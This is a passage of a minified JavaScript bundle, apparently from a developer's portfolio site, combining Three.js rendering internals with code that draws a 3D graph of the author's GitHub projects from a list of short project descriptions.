Et=Lt.get(b).__webglFramebuffer;if(b.isWebGLCubeRenderTarget&&mt!==void 0&&(Et=Et[mt]),Et){ft.bindFramebuffer(N.FRAMEBUFFER,Et);try{const bt=b.texture,Nt=bt.format,wt=bt.type;if(Nt!==ke&&dt.convert(Nt)!==N.getParameter(N.IMPLEMENTATION_COLOR_READ_FORMAT)){console.error("THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not in RGBA or implementation defined format.");return}const Ct=wt===hi&&(vt.has("EXT_color_buffer_half_float")||Rt.isWebGL2&&vt.has("EXT_color_buffer_float"));if(wt!==ln&&dt.convert(wt)!==N.getParameter(N.IMPLEMENTATION_COLOR_READ_TYPE)&&!(wt===sn&&(Rt.isWebGL2||vt.has("OES_texture_float")||vt.has("WEBGL_color_buffer_float")))&&!Ct){console.error("THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not in UnsignedByteType or implementation defined type.");return}I>=0&&I<=b.width-z&&F>=0&&F<=b.height-U&&N.readPixels(I,F,z,U,dt.convert(Nt),dt.convert(wt),lt)}finally{const bt=T!==null?Lt.get(T).__webglFramebuffer:null;ft.bindFramebuffer(N.FRAMEBUFFER,bt)}}},this.copyFramebufferToTexture=function(b,I,F=0){const z=Math.pow(2,-F),U=Math.floor(I.image.width*z),lt=Math.floor(I.image.height*z);A.setTexture2D(I,0),N.copyTexSubImage2D(N.TEXTURE_2D,F,0,0,b.x,b.y,U,lt),ft.unbindTexture()},this.copyTextureToTexture=function(b,I,F,z=0){const U=I.image.width,lt=I.image.height,mt=dt.convert(F.format),Et=dt.convert(F.type);A.setTexture2D(F,0),N.pixelStorei(N.UNPACK_FLIP_Y_WEBGL,F.flipY),N.pixelStorei(N.UNPACK_PREMULTIPLY_ALPHA_WEBGL,F.premultiplyAlpha),N.pixelStorei(N.UNPACK_ALIGNMENT,F.unpackAlignment),I.isDataTexture?N.texSubImage2D(N.TEXTURE_2D,z,b.x,b.y,U,lt,mt,Et,I.image.data):I.isCompressedTexture?N.compressedTexSubImage2D(N.TEXTURE_2D,z,b.x,b.y,I.mipmaps[0].width,I.mipmaps[0].height,mt,I.mipmaps[0].data):N.texSubImage2D(N.TEXTURE_2D,z,b.x,b.y,mt,Et,I.image),z===0&&F.generateMipmaps&&N.generateMipmap(N.TEXTURE_2D),ft.unbindTexture()},this.copyTextureToTexture3D=function(b,I,F,z,U=0){if(_.isWebGL1Renderer){console.warn("THREE.WebGLRenderer.copyTextureToTexture3D: can only be used with WebGL2.");return}const lt=b.max.x-b.min.x+1,mt=b.max.y-b.min.y+1,Et=b.max.z-b.min.z+1,bt=dt.convert(z.format),Nt=dt.convert(z.type);let wt;if(z.isData3DTexture)A.setTexture3D(z,0),wt=N.TEXTURE_3D;else if(z.isDataArrayTexture||z.isCompressedArrayTexture)A.setTexture2DArray(z,0),wt=N.TEXTURE_2D_ARRAY;else{console.warn("THREE.WebGLRenderer.copyTextureToTexture3D: only supports THREE.DataTexture3D and THREE.DataTexture2DArray.");return}N.pixelStorei(N.UNPACK_FLIP_Y_WEBGL,z.flipY),N.pixelStorei(N.UNPACK_PREMULTIPLY_ALPHA_WEBGL,z.premultiplyAlpha),N.pixelStorei(N.UNPACK_ALIGNMENT,z.unpackAlignment);const Ct=N.getParameter(N.UNPACK_ROW_LENGTH),te=N.getParameter(N.UNPACK_IMAGE_HEIGHT),Me=N.getParameter(N.UNPACK_SKIP_PIXELS),ae=N.getParameter(N.UNPACK_SKIP_ROWS),Ve=N.getParameter(N.UNPACK_SKIP_IMAGES),Kt=F.isCompressedTexture?F.mipmaps[U]:F.image;N.pixelStorei(N.UNPACK_ROW_LENGTH,Kt.width),N.pixelStorei(N.UNPACK_IMAGE_HEIGHT,Kt.height),N.pixelStorei(N.UNPACK_SKIP_PIXELS,b.min.x),N.pixelStorei(N.UNPACK_SKIP_ROWS,b.min.y),N.pixelStorei(N.UNPACK_SKIP_IMAGES,b.min.z),F.isDataTexture||F.isData3DTexture?N.texSubImage3D(wt,U,I.x,I.y,I.z,lt,mt,Et,bt,Nt,Kt.data):F.isCompressedArrayTexture?(console.warn("THREE.WebGLRenderer.copyTextureToTexture3D: untested support for compressed srcTexture."),N.compressedTexSubImage3D(wt,U,I.x,I.y,I.z,lt,mt,Et,bt,Kt.data)):N.texSubImage3D(wt,U,I.x,I.y,I.z,lt,mt,Et,bt,Nt,Kt),N.pixelStorei(N.UNPACK_ROW_LENGTH,Ct),N.pixelStorei(N.UNPACK_IMAGE_HEIGHT,te),N.pixelStorei(N.UNPACK_SKIP_PIXELS,Me),N.pixelStorei(N.UNPACK_SKIP_ROWS,ae),N.pixelStorei(N.UNPACK_SKIP_IMAGES,Ve),U===0&&z.generateMipmaps&&N.generateMipmap(wt),ft.unbindTexture()},this.initTexture=function(b){b.isCubeTexture?A.setTextureCube(b,0):b.isData3DTexture?A.setTexture3D(b,0):b.isDataArrayTexture||b.isCompressedArrayTexture?A.setTexture2DArray(b,0):A.setTexture2D(b,0),ft.unbindTexture()},this.resetState=function(){w=0,S=0,T=null,ft.reset(),Pt.reset()},typeof __THREE_DEVTOOLS__<"u"&&__THREE_DEVTOOLS__.dispatchEvent(new CustomEvent("observe",{detail:this}))}get coordinateSystem(){return Ke}get outputColorSpace(){return this._outputColorSpace}set outputColorSpace(t){this._outputColorSpace=t;const e=this.getContext();e.drawingBufferColorSpace=t===os?"display-p3":"srgb",e.unpackColorSpace=Wt.workingColorSpace===nr?"display-p3":"srgb"}get outputEncoding(){return console.warn("THREE.WebGLRenderer: Property .outputEncoding has been removed. Use .outputColorSpace instead."),this.outputColorSpace===le?Sn:uo}set outputEncoding(t){console.warn("THREE.WebGLRenderer: Property .outputEncoding has been removed. Use .outputColorSpace instead."),this.outputColorSpace=t===Sn?le:Ze}get useLegacyLights(){return console.warn("THREE.WebGLRenderer: The property .useLegacyLights has been deprecated. Migrate your lighting according to the following guide: https://discourse.threejs.org/t/updates-to-lighting-in-three-js-r155/53733."),this._useLegacyLights}set useLegacyLights(t){console.warn("THREE.WebGLRenderer: The property .useLegacyLights has been deprecated. Migrate your lighting according to the following guide: https://discourse.threejs.org/t/updates-to-lighting-in-three-js-r155/53733."),this._useLegacyLights=t}}class $f extends Io{}$f.prototype.isWebGL1Renderer=!0;class Kf extends ye{constructor(){super(),this.isScene=!0,this.type="Scene",this.background=null,this.environment=null,this.fog=null,this.backgroundBlurriness=0,this.backgroundIntensity=1,this.overrideMaterial=null,typeof __THREE_DEVTOOLS__<"u"&&__THREE_DEVTOOLS__.dispatchEvent(new CustomEvent("observe",{detail:this}))}copy(t,e){return super.copy(t,e),t.background!==null&&(this.background=t.background.clone()),t.environment!==null&&(this.environment=t.environment.clone()),t.fog!==null&&(this.fog=t.fog.clone()),this.backgroundBlurriness=t.backgroundBlurriness,this.backgroundIntensity=t.backgroundIntensity,t.overrideMaterial!==null&&(this.overrideMaterial=t.overrideMaterial.clone()),this.matrixAutoUpdate=t.matrixAutoUpdate,this}toJSON(t){const e=super.toJSON(t);return this.fog!==null&&(e.object.fog=this.fog.toJSON()),this.backgroundBlurriness>0&&(e.object.backgroundBlurriness=this.backgroundBlurriness),this.backgroundIntensity!==1&&(e.object.backgroundIntensity=this.backgroundIntensity),e}}class za extends Be{constructor(t,e,n,r=1){super(t,e,n),this.isInstancedBufferAttribute=!0,this.meshPerAttribute=r}copy(t){return super.copy(t),this.meshPerAttribute=t.meshPerAttribute,this}toJSON(){const t=super.toJSON();return t.meshPerAttribute=this.meshPerAttribute,t.isInstancedBufferAttribute=!0,t}}const Wn=new Zt,Ga=new Zt,Vi=[],Ha=new Rn,Zf=new Zt,li=new He,ci=new ti;class Gr extends He{constructor(t,e,n){super(t,e),this.isInstancedMesh=!0,this.instanceMatrix=new za(new Float32Array(n*16),16),this.instanceColor=null,this.count=n,this.boundingBox=null,this.boundingSphere=null;for(let r=0;r<n;r++)this.setMatrixAt(r,Zf)}computeBoundingBox(){const t=this.geometry,e=this.count;this.boundingBox===null&&(this.boundingBox=new Rn),t.boundingBox===null&&t.computeBoundingBox(),this.boundingBox.makeEmpty();for(let n=0;n<e;n++)this.getMatrixAt(n,Wn),Ha.copy(t.boundingBox).applyMatrix4(Wn),this.boundingBox.union(Ha)}computeBoundingSphere(){const t=this.geometry,e=this.count;this.boundingSphere===null&&(this.boundingSphere=new ti),t.boundingSphere===null&&t.computeBoundingSphere(),this.boundingSphere.makeEmpty();for(let n=0;n<e;n++)this.getMatrixAt(n,Wn),ci.copy(t.boundingSphere).applyMatrix4(Wn),this.boundingSphere.union(ci)}copy(t,e){return super.copy(t,e),this.instanceMatrix.copy(t.instanceMatrix),t.instanceColor!==null&&(this.instanceColor=t.instanceColor.clone()),this.count=t.count,t.boundingBox!==null&&(this.boundingBox=t.boundingBox.clone()),t.boundingSphere!==null&&(this.boundingSphere=t.boundingSphere.clone()),this}getColorAt(t,e){e.fromArray(this.instanceColor.array,t*3)}getMatrixAt(t,e){e.fromArray(this.instanceMatrix.array,t*16)}raycast(t,e){const n=this.matrixWorld,r=this.count;if(li.geometry=this.geometry,li.material=this.material,li.material!==void 0&&(this.boundingSphere===null&&this.computeBoundingSphere(),ci.copy(this.boundingSphere),ci.applyMatrix4(n),t.ray.intersectsSphere(ci)!==!1))for(let s=0;s<r;s++){this.getMatrixAt(s,Wn),Ga.multiplyMatrices(n,Wn),li.matrixWorld=Ga,li.raycast(t,Vi);for(let o=0,a=Vi.length;o<a;o++){const l=Vi[o];l.instanceId=s,l.object=this,e.push(l)}Vi.length=0}}setColorAt(t,e){this.instanceColor===null&&(this.instanceColor=new za(new Float32Array(this.instanceMatrix.count*3),3)),e.toArray(this.instanceColor.array,t*3)}setMatrixAt(t,e){e.toArray(this.instanceMatrix.array,t*16)}updateMorphTargets(){}dispose(){this.dispatchEvent({type:"dispose"})}}class Qi extends gi{constructor(t){super(),this.isLineBasicMaterial=!0,this.type="LineBasicMaterial",this.color=new Ht(16777215),this.map=null,this.linewidth=1,this.linecap="round",this.linejoin="round",this.fog=!0,this.setValues(t)}copy(t){return super.copy(t),this.color.copy(t.color),this.map=t.map,this.linewidth=t.linewidth,this.linecap=t.linecap,this.linejoin=t.linejoin,this.fog=t.fog,this}}const Va=new L,Wa=new L,Xa=new Zt,Hr=new ls,Wi=new ti;class Jf extends ye{constructor(t=new Ie,e=new Qi){super(),this.isLine=!0,this.type="Line",this.geometry=t,this.material=e,this.updateMorphTargets()}copy(t,e){return super.copy(t,e),this.material=Array.isArray(t.material)?t.material.slice():t.material,this.geometry=t.geometry,this}computeLineDistances(){const t=this.geometry;if(t.index===null){const e=t.attributes.position,n=[0];for(let r=1,s=e.count;r<s;r++)Va.fromBufferAttribute(e,r-1),Wa.fromBufferAttribute(e,r),n[r]=n[r-1],n[r]+=Va.distanceTo(Wa);t.setAttribute("lineDistance",new de(n,1))}else console.warn("THREE.Line.computeLineDistances(): Computation only possible with non-indexed BufferGeometry.");return this}raycast(t,e){const n=this.geometry,r=this.matrixWorld,s=t.params.Line.threshold,o=n.drawRange;if(n.boundingSphere===null&&n.computeBoundingSphere(),Wi.copy(n.boundingSphere),Wi.applyMatrix4(r),Wi.radius+=s,t.ray.intersectsSphere(Wi)===!1)return;Xa.copy(r).invert(),Hr.copy(t.ray).applyMatrix4(Xa);const a=s/((this.scale.x+this.scale.y+this.scale.z)/3),l=a*a,c=new L,u=new L,h=new L,p=new L,m=this.isLineSegments?2:1,E=n.index,f=n.attributes.position;if(E!==null){const d=Math.max(0,o.start),g=Math.min(E.count,o.start+o.count);for(let _=d,v=g-1;_<v;_+=m){const w=E.getX(_),S=E.getX(_+1);if(c.fromBufferAttribute(f,w),u.fromBufferAttribute(f,S),Hr.distanceSqToSegment(c,u,p,h)>l)continue;p.applyMatrix4(this.matrixWorld);const D=t.ray.origin.distanceTo(p);D<t.near||D>t.far||e.push({distance:D,point:h.clone().applyMatrix4(this.matrixWorld),index:_,face:null,faceIndex:null,object:this})}}else{const d=Math.max(0,o.start),g=Math.min(f.count,o.start+o.count);for(let _=d,v=g-1;_<v;_+=m){if(c.fromBufferAttribute(f,_),u.fromBufferAttribute(f,_+1),Hr.distanceSqToSegment(c,u,p,h)>l)continue;p.applyMatrix4(this.matrixWorld);const S=t.ray.origin.distanceTo(p);S<t.near||S>t.far||e.push({distance:S,point:h.clone().applyMatrix4(this.matrixWorld),index:_,face:null,faceIndex:null,object:this})}}}updateMorphTargets(){const e=this.geometry.morphAttributes,n=Object.keys(e);if(n.length>0){const r=e[n[0]];if(r!==void 0){this.morphTargetInfluences=[],this.morphTargetDictionary={};for(let s=0,o=r.length;s<o;s++){const a=r[s].name||String(s);this.morphTargetInfluences.push(0),this.morphTargetDictionary[a]=s}}}}}const qa=new L,Ya=new L;class is extends Jf{constructor(t,e){super(t,e),this.isLineSegments=!0,this.type="LineSegments"}computeLineDistances(){const t=this.geometry;if(t.index===null){const e=t.attributes.position,n=[];for(let r=0,s=e.count;r<s;r+=2)qa.fromBufferAttribute(e,r),Ya.fromBufferAttribute(e,r+1),n[r]=r===0?0:n[r-1],n[r+1]=n[r]+qa.distanceTo(Ya);t.setAttribute("lineDistance",new de(n,1))}else console.warn("THREE.LineSegments.computeLineDistances(): Computation only possible with non-indexed BufferGeometry.");return this}}class tr extends Ie{constructor(t=.5,e=1,n=32,r=1,s=0,o=Math.PI*2){super(),this.type="RingGeometry",this.parameters={innerRadius:t,outerRadius:e,thetaSegments:n,phiSegments:r,thetaStart:s,thetaLength:o},n=Math.max(3,n),r=Math.max(1,r);const a=[],l=[],c=[],u=[];let h=t;const p=(e-t)/r,m=new L,E=new zt;for(let x=0;x<=r;x++){for(let f=0;f<=n;f++){const d=s+f/n*o;m.x=h*Math.cos(d),m.y=h*Math.sin(d),l.push(m.x,m.y,m.z),c.push(0,0,1),E.x=(m.x/e+1)/2,E.y=(m.y/e+1)/2,u.push(E.x,E.y)}h+=p}for(let x=0;x<r;x++){const f=x*(n+1);for(let d=0;d<n;d++){const g=d+f,_=g,v=g+n+1,w=g+n+2,S=g+1;a.push(_,v,S),a.push(v,w,S)}}this.setIndex(a),this.setAttribute("position",new de(l,3)),this.setAttribute("normal",new de(c,3)),this.setAttribute("uv",new de(u,2))}copy(t){return super.copy(t),this.parameters=Object.assign({},t.parameters),this}static fromJSON(t){return new tr(t.innerRadius,t.outerRadius,t.thetaSegments,t.phiSegments,t.thetaStart,t.thetaLength)}}class ps extends Ie{constructor(t=1,e=32,n=16,r=0,s=Math.PI*2,o=0,a=Math.PI){super(),this.type="SphereGeometry",this.parameters={radius:t,widthSegments:e,heightSegments:n,phiStart:r,phiLength:s,thetaStart:o,thetaLength:a},e=Math.max(3,Math.floor(e)),n=Math.max(2,Math.floor(n));const l=Math.min(o+a,Math.PI);let c=0;const u=[],h=new L,p=new L,m=[],E=[],x=[],f=[];for(let d=0;d<=n;d++){const g=[],_=d/n;let v=0;d===0&&o===0?v=.5/e:d===n&&l===Math.PI&&(v=-.5/e);for(let w=0;w<=e;w++){const S=w/e;h.x=-t*Math.cos(r+S*s)*Math.sin(o+_*a),h.y=t*Math.cos(o+_*a),h.z=t*Math.sin(r+S*s)*Math.sin(o+_*a),E.push(h.x,h.y,h.z),p.copy(h).normalize(),x.push(p.x,p.y,p.z),f.push(S+v,1-_),g.push(c++)}u.push(g)}for(let d=0;d<n;d++)for(let g=0;g<e;g++){const _=u[d][g+1],v=u[d][g],w=u[d+1][g],S=u[d+1][g+1];(d!==0||o>0)&&m.push(_,v,S),(d!==n-1||l<Math.PI)&&m.push(v,w,S)}this.setIndex(m),this.setAttribute("position",new de(E,3)),this.setAttribute("normal",new de(x,3)),this.setAttribute("uv",new de(f,2))}copy(t){return super.copy(t),this.parameters=Object.assign({},t.parameters),this}static fromJSON(t){return new ps(t.radius,t.widthSegments,t.heightSegments,t.phiStart,t.phiLength,t.thetaStart,t.thetaLength)}}class Lo{constructor(t,e,n=0,r=1/0){this.ray=new ls(t,e),this.near=n,this.far=r,this.camera=null,this.layers=new cs,this.params={Mesh:{},Line:{threshold:1},LOD:{},Points:{threshold:1},Sprite:{}}}set(t,e){this.ray.set(t,e)}setFromCamera(t,e){e.isPerspectiveCamera?(this.ray.origin.setFromMatrixPosition(e.matrixWorld),this.ray.direction.set(t.x,t.y,.5).unproject(e).sub(this.ray.origin).normalize(),this.camera=e):e.isOrthographicCamera?(this.ray.origin.set(t.x,t.y,(e.near+e.far)/(e.near-e.far)).unproject(e),this.ray.direction.set(0,0,-1).transformDirection(e.matrixWorld),this.camera=e):console.error("THREE.Raycaster: Unsupported camera type: "+e.type)}intersectObject(t,e=!0,n=[]){return rs(t,this,n,e),n.sort(ja),n}intersectObjects(t,e=!0,n=[]){for(let r=0,s=t.length;r<s;r++)rs(t[r],this,n,e);return n.sort(ja),n}}function ja(i,t){return i.distance-t.distance}function rs(i,t,e,n){if(i.layers.test(t.layers)&&i.raycast(t,e),n===!0){const r=i.children;for(let s=0,o=r.length;s<o;s++)rs(r[s],t,e,!0)}}typeof __THREE_DEVTOOLS__<"u"&&__THREE_DEVTOOLS__.dispatchEvent(new CustomEvent("register",{detail:{revision:ss}}));typeof window<"u"&&(window.__THREE__?console.warn("WARNING: Multiple instances of Three.js being imported."):window.__THREE__=ss);function Qf(){const i=new Ce(35,1,1,5e3);i.position.set(0,0,1100),i.lookAt(0,0,0);let t=0,e=0,n=1,r=0,s=0,o=1,a=!1,l=0,c=0,u=0,h=0;const p=.005,m=new Map;let E=0,x=1;const f=v=>{if(m.set(v.pointerId,{x:v.clientX,y:v.clientY}),m.size===1)a=!0,l=v.clientX,c=v.clientY;else if(m.size===2){a=!1;const w=Array.from(m.values()),S=w[0].x-w[1].x,T=w[0].y-w[1].y;E=Math.hypot(S,T),x=o}},d=v=>{m.delete(v.pointerId),m.size<2&&(E=0),m.size===0&&(a=!1)},g=v=>{if(m.has(v.pointerId)&&m.set(v.pointerId,{x:v.clientX,y:v.clientY}),m.size>=2&&E>0){const w=Array.from(m.values()),S=w[0].x-w[1].x,T=w[0].y-w[1].y,y=Math.hypot(S,T)/E;o=Math.max(.5,Math.min(2.5,x*y));return}if(a){const w=v.clientX-l,S=v.clientY-c;l=v.clientX,c=v.clientY,r+=w*.005,s=Math.max(-.6,Math.min(.6,s+S*.003))}else u=(v.clientX/window.innerWidth-.5)*.06,h=(v.clientY/window.innerHeight-.5)*.04},_=v=>{v.preventDefault(),o=Math.max(.5,Math.min(2.5,o*(1-v.deltaY*8e-4)))};return{camera:i,update(v){t+=(r-t)*.08,e+=(s-e)*.08,n+=(o-n)*.08,!a&&m.size===0&&(r+=p*v);const w=1100/n,S=t+u,T=e+h;i.position.x=w*Math.sin(S)*Math.cos(T),i.position.y=w*Math.sin(T),i.position.z=w*Math.cos(S)*Math.cos(T),i.lookAt(0,0,0)},attach(v){return v.addEventListener("pointerdown",f),v.addEventListener("pointerup",d),v.addEventListener("pointercancel",d),v.addEventListener("pointerleave",d),v.addEventListener("pointermove",g),v.addEventListener("wheel",_,{passive:!1}),()=>{v.removeEventListener("pointerdown",f),v.removeEventListener("pointerup",d),v.removeEventListener("pointercancel",d),v.removeEventListener("pointerleave",d),v.removeEventListener("pointermove",g),v.removeEventListener("wheel",_)}}}}function fs(i){let t=i>>>0;const e=()=>(t=t*1664525+1013904223>>>0,(t>>>0)/4294967296);return e.gauss=()=>{let n=0,r=0;for(;!n;)n=e();for(;!r;)r=e();return Math.sqrt(-2*Math.log(n))*Math.cos(2*Math.PI*r)},e}const bn=[{id:"vaal",name:"VAAL",tier:1,nodeCount:140,lang:["python"],category:"ai",blurb:"AI coding agent CLI. Routes prompts across local Ollama models and cloud LLMs (Claude, OpenAI). Tool-use orchestration, install scaffolding, named for the PoE Vaal Orb.",githubUrl:"https://github.com/0xE666/vaal",pinIds:["vaal_route","vaal_tooluse"]},{id:"winint",name:"WINDOWS-INTERNALS",tier:1,nodeCount:140,lang:["cpp","c"],category:"security",blurb:"Educational whitehat security research: Windows process internals, PE-format manual mapping, kernel-driver dispatch, signature scanning, IAT patching. Documents the techniques the Windows AC/EDR landscape was built to detect.",pinIds:["manual_map","sigscan","ioctl_dispatch","iat_patch","intel_mmmap","intel_mapio","kernel_resolver","kernel_init_user","page_walk","page_protect_check","drv_entry","drv_ift_probe","mm_section_map","mm_reloc","mm_imports","mem_read","mem_protect","irp_dispatch"]},{id:"soundmap",name:"SOUNDMAP-API",tier:2,nodeCount:75,lang:["python"],category:"security",blurb:"Python wrapper for the Soundmap iOS app, reverse-engineered from observed traffic. Replays signed mobile API requests for automated trading and song collection.",githubUrl:"https://github.com/0xE666/Soundmap-API",pinIds:["soundmap_sign","soundmap_request"]},{id:"poe_null",name:"POE_NULL",tier:2,nodeCount:70,lang:["csharp"],category:"game-tool",blurb:"C# Path of Exile 2 game-state visualizer. Real-time scene reconstruction and item-state diffing.",githubUrl:"https://github.com/0xE666/poe_null",pinIds:["poe_null_scene"]},{id:"trade_api",name:"POE-TRADE-API",tier:2,nodeCount:70,lang:["python"],category:"game-tool",blurb:"Python client for the Path of Exile trade API. Token-bucket rate limiter, session pooling, paginated query streaming.",githubUrl:"https://github.com/0xE666/path-of-exile-trade-api",pinIds:["trade_limit"]},{id:"poe_watcher",name:"POE-WATCHER",tier:2,nodeCount:65,lang:["python"],category:"game-tool",blurb:"Lightweight Windows tray utility. Detects which PoE process is foreground (1 vs 2) and launches the correct trading tool. <1% CPU, ~20MB RAM.",githubUrl:"https://github.com/0xE666/path-of-exile-watcher",pinIds:["poe_watcher_detect"]},{id:"minabot",name:"MINABOT",tier:3,nodeCount:45,lang:["python"],category:"bot",blurb:"Multi-purpose Discord bot. Cogs-based plugin architecture, async DB layer, scheduled scraping tasks.",githubUrl:"https://github.com/0xE666/minaBot",pinIds:["minabot_cog"]},{id:"pentest",name:"PENTEST-FRAMEWORK",tier:3,nodeCount:45,lang:["python"],category:"security",blurb:"Modular pentest framework. Pluggable payloads, wordlists, plugins, and report renderer.",pinIds:["pentest_plugin"]},{id:"crypto",name:"ALGO-TRADING",tier:3,nodeCount:45,lang:["python"],category:"data",blurb:"Algorithmic crypto trading toolkit. Alpha generation, backtesting engine, dashboard.",pinIds:["crypto_backtest"]},{id:"poe_ml",name:"POE-ML",tier:3,nodeCount:40,lang:["python"],category:"data",blurb:"ML training pipeline for Path of Exile data — items, prices, build classification.",pinIds:["poe_ml_train"]},{id:"assistant",name:"ASSISTANT",tier:3,nodeCount:35,lang:["python"],category:"ai",blurb:"Personal AI assistant scaffolding (full description filled in at impl time after deeper repo inspection).",pinIds:[]},{id:"govdeals",name:"GOVDEALS",tier:4,nodeCount:22,lang:["python"],category:"web",blurb:"Government auction (govdeals.com) scraper and watch-list.",githubUrl:"https://github.com/0xE666/govdeals",pinIds:[]},{id:"dndb",name:"DNDBEYOND-SCRAPER",tier:4,nodeCount:22,lang:["python"],category:"web",blurb:"D&D Beyond data scraper. Authenticated session reuse, rate-aware pagination.",githubUrl:"https://github.com/0xE666/dndbeyond-scraper",pinIds:[]},{id:"espotify",name:"ESPOTIFY",tier:4,nodeCount:22,lang:["python"],category:"misc",blurb:"Controller-driven Spotify control. Pause / next / volume from a PS4/Xbox pad without alt-tabbing out of games.",githubUrl:"https://github.com/0xE666/eSpotify",pinIds:[]},{id:"anime",name:"ANIME.E-E.LOL",tier:4,nodeCount:22,lang:["php","js"],category:"web",blurb:"Anime streaming site. PHP backend with embed-proxy layer, scraping, history tracking.",pinIds:[]},{id:"movies",name:"MOVIES.E-E.LOL",tier:4,nodeCount:22,lang:["php","js"],category:"web",blurb:"Movies streaming site. Companion to anime.e-e.lol.",pinIds:[]},{id:"vergil",name:"VERGIL",tier:4,nodeCount:18,lang:["python"],category:"bot",blurb:"Discord bot for misterdrprof's colorful traders server.",githubUrl:"https://github.com/0xE666/vergil",pinIds:[]},{id:"rlbot",name:"RLBOT",tier:4,nodeCount:18,lang:["python"],category:"bot",blurb:"Discord bot for Rocket League stats.",githubUrl:"https://github.com/0xE666/RLBot",pinIds:[]},{id:"rocketmem",name:"ROCKETMEMORY",tier:4,nodeCount:20,lang:["python"],category:"security",blurb:"Educational memory-edit experiment: locating and modifying Rocket League camera-FoV/angle/distance pointers via signature scanning, beyond the in-game UI limits.",githubUrl:"https://github.com/0xE666/rocketMemory",pinIds:[]},{id:"tarkov_market",name:"TARKOV-MARKET-API",tier:4,nodeCount:18,lang:["python"],category:"game-tool",blurb:"Wrapper for tarkov-market.com flea/item endpoints.",githubUrl:"https://github.com/0xE666/Tarkov-Market-API-Wrapper",pinIds:[]},{id:"nep",name:"NEP",tier:4,nodeCount:16,lang:["python"],category:"data",blurb:"Audio fingerprint / modification experiment.",pinIds:[]},{id:"leetcode",name:"LEETCODE",tier:5,nodeCount:8,lang:["python"],category:"misc",blurb:"Solved problem archive.",githubUrl:"https://github.com/0xE666/leetcode",pinIds:[]}],th=850,eh=250,Xi=2500,Do=1600,No=900;function nh(i,t){const e=[[800,460],[1180,240],[320,280],[1300,720],[220,700],[1430,200],[560,720],[1040,760],[200,460],[1500,460],[720,140],[120,180],[880,800],[1060,140],[400,140],[60,360],[1540,580],[60,580],[1540,320],[340,800],[1180,800],[120,800],[1540,100]],n=[...i].sort((s,o)=>s.tier-o.tier||o.nodeCount-s.nodeCount),r=[];for(let s=0;s<n.length;s++){const o=n[s],[a,l]=e[s]??[Do/2,No/2],c=a+(t()-.5)*30,u=l+(t()-.5)*30;r.push({id:o.id,project:o,x:Math.max(61,Math.min(1539,c)),y:Math.max(61,Math.min(839,u)),r:Math.max(45,o.nodeCount*1.6),nodes:0})}return r}function ih(i,t){const e=i.reduce((r,s)=>r+s.project.nodeCount,0),n=e>t?t/e:1;for(const r of i)r.nodes=Math.max(4,Math.round(r.project.nodeCount*n))}function rh(i,t,e=1){const n=fs(t),r=nh(i,n);ih(r,th);const s=[];for(const a of r){const l=Math.max(4,Math.round(a.nodes*.78*e)),c=Math.max(0,Math.round((a.nodes-Math.round(a.nodes*.78))*e));for(let u=0;u<l;u++){const h=n(),p=a.r*.55*Math.pow(h,.55),m=n()*Math.PI*2;s.push({x:a.x+Math.cos(m)*p+n.gauss()*6,y:a.y+Math.sin(m)*p+n.gauss()*6,z:n.gauss()*18,knotId:a.id,depth:.6+n()*.4})}for(let u=0;u<c;u++){const h=n()*Math.PI*2,p=a.r*(.78+n()*.34);s.push({x:a.x+Math.cos(h)*p,y:a.y+Math.sin(h)*p,z:n.gauss()*12,knotId:a.id,depth:.25+n()*.45})}}const o=Math.round(eh*e);for(let a=0;a<o;a++)s.push({x:60+n()*(Do-120),y:60+n()*(No-120),z:n.gauss()*30,knotId:null,depth:n()*.5});return{knots:r,nodes:s}}const sh=1600,ah=900,oh=(i,t,e=0)=>new L(i-sh/2,-(t-ah/2),e);function $a(i,t,e,n=28){const r=[];for(let o=1;o<8;o++){const a=o/8*Math.PI,l=Math.sin(a),c=Math.cos(a);for(let u=0;u<n;u++){const h=u/n*Math.PI*2,p=(u+1)/n*Math.PI*2;r.push(Math.cos(h)*l*i,c*t,Math.sin(h)*l*e,Math.cos(p)*l*i,c*t,Math.sin(p)*l*e)}}for(let o=0;o<8;o++){const a=o/8*Math.PI*2;for(let l=0;l<n;l++){const c=l/n*Math.PI,u=(l+1)/n*Math.PI;r.push(Math.cos(a)*Math.sin(c)*i,Math.cos(c)*t,Math.sin(a)*Math.sin(c)*e,Math.cos(a)*Math.sin(u)*i,Math.cos(u)*t,Math.sin(a)*Math.sin(u)*e)}}const s=new Ie;return s.setAttribute("position",new de(r,3)),s}function lh(i,t=66){const e=fs(t),n=new En,r=[];for(const s of i){const o=new En,a=oh(s.x,s.y);o.position.copy(a);const l=Math.max(3,Math.floor(s.r/35)),c=.55;for(let h=0;h<l;h++){const p=s.r*(.55+h*.1),m=.45+e()*.55,E=p,x=p*m,f=p*(.55+e()*.5),d=$a(E,x,f,24),g=new Qi({color:16777215,transparent:!0,opacity:Math.max(.1,c-h*.06)}),_=new is(d,g);_.rotation.x=e()*Math.PI,_.rotation.y=e()*Math.PI,_.rotation.z=e()*Math.PI,o.add(_),r.push({mesh:_,vel:new L((e()-.5)*.04,(e()-.5)*.05,(e()-.5)*.03)})}const u=s.r*.22;for(let h=0;h<5;h++){const p=$a(u,u*.4,u,16),m=new Qi({color:16777215,transparent:!0,opacity:.7}),E=new is(p,m);E.rotation.set(e()*Math.PI,e()*Math.PI,h*.6),o.add(E),r.push({mesh:E,vel:new L((e()-.5)*.08,(e()-.5)*.08,(e()-.5)*.05)})}n.add(o)}return{group:n,spins:r}}function ch(i,t){for(const e of i)e.mesh.rotation.x+=e.vel.x*t,e.mesh.rotation.y+=e.vel.y*t,e.mesh.rotation.z+=e.vel.z*t}const dh=(i,t)=>{const e=i.x-t.x,n=i.y-t.y,r=i.z-t.z;return e*e+n*n+r*r};function uh(i,t){const e=fs(t),n=i.nodes,r=Math.floor(Xi*.6),s=Math.floor(Xi*.25),o=Xi-r-s,a=[],l=[],c=[],u=new Map;for(let f=0;f<n.length;f++){const d=n[f].knotId;d&&(u.has(d)||u.set(d,[]),u.get(d).push(f))}t:for(const f of u.values())for(const d of f){const g=f.filter(_=>_!==d).map(_=>({j:_,d:dh(n[d],n[_])})).sort((_,v)=>_.d-v.d).slice(0,6+Math.floor(e()*4));for(const _ of g){if(a.length>=r)break t;a.push({a:d,b:_.j,layer:"inner",weight:1})}}const h=new Map,p=new Map;for(const f of i.knots){const d=f.project.category;h.has(d)||h.set(d,[]),h.get(d).push(f.id);for(const g of f.project.lang)p.has(g)||p.set(g,[]),p.get(g).push(f.id)}const m=new Set,E=(f,d)=>{if(f===d)return;const g=f<d?`${f}|${d}`:`${d}|${f}`;m.add(g)};for(const 